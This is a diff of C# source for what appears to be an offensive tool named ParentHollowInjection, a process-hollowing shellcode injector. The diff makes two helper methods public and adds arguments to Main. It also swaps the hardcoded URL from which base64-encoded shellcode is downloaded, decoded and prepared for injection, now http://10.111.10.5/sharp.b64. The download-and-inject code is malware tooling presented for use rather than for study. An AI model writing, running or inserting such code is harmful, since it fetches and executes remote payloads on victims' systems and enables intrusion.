@@ -207,7 +207,7 @@ namespace ParentHollowInjection
             }
             const int AttributeSize = 24;
 
-            private bool nt_success(long v)
+            public bool nt_success(long v)
             {
                 return (v >= 0);
             }
@@ -308,7 +308,7 @@ namespace ParentHollowInjection
                 return new KeyValuePair<int, IntPtr>(i, ptr);
             }
 
-            private IntPtr GetEntryFromBuffer(byte[] b)
+            public IntPtr GetEntryFromBuffer(byte[] b)
             {
                 IntPtr res = IntPtr.Zero;
                 unsafe
@@ -513,7 +513,7 @@ namespace ParentHollowInjection
         }
 
 
-        public static void Main()
+        public static void Main(string[] args)
         {
             try
             {
@@ -539,7 +539,7 @@ namespace ParentHollowInjection
                 // OR hardcode the URL to remotely download the base64 encoded shellcode in memory
                 byte[] buf = new byte[] { };
                 string shellcode = "<PLACEHOLDER>";
-                string urlToSC = @"http://192.168.1.10/payload.b64";
+                string urlToSC = @"http://10.111.10.5/sharp.b64";
                 shellcode = GetCode(urlToSC);  //if NOT downloading the shellcode, command this line out. 
                 buf = Convert.FromBase64String(shellcode);
 
